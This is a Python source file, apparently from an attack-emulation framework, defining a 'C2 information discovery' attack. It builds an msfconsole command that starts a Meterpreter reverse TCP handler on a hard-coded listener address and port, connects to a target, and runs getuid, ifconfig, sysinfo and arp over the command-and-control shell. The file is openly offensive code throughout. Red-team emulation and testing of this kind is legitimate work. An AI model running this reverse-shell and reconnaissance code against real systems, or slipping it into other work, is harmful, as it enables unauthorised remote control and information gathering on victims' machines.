import time

from attacks import AttackInfo
from attacks.reverse_shell_attack_options import ReverseShellAttack, ReverseShellAttackOptions


class C2InfoDiscoveryAttackOptions(ReverseShellAttackOptions):
    reverse_type = "Reverse protocol type"

    def _set_defaults(self):
        self.lhost = "172.18.0.3"
        self.lport = "12345"
        self.reverse_type = "tcp"


class C2InfoDiscoveryAttack(ReverseShellAttack):
    info = AttackInfo(
        name="c2_info_discovery",
        description="Information discovery over the C&C channel")
    options_class = C2InfoDiscoveryAttackOptions
    handler = None

    def run(self):
        self.connect_to_target()
        with self.wrap_ssh_exceptions():
            self.exec_commands_on_shell(self.commands)

    def _reverse_command(self):
        return (f'msfconsole -x "use exploit/multi/handler; '
                f'set PAYLOAD linux/x64/meterpreter/reverse_{self.options.reverse_type}; '
                f'set LHOST {self.options.lhost}; set LPORT {self.options.lport}; run" ')

    def _append_command(self):
        self.commands.extend([
            "getuid",
            "ifconfig",
            "sysinfo",
            "arp"
        ])
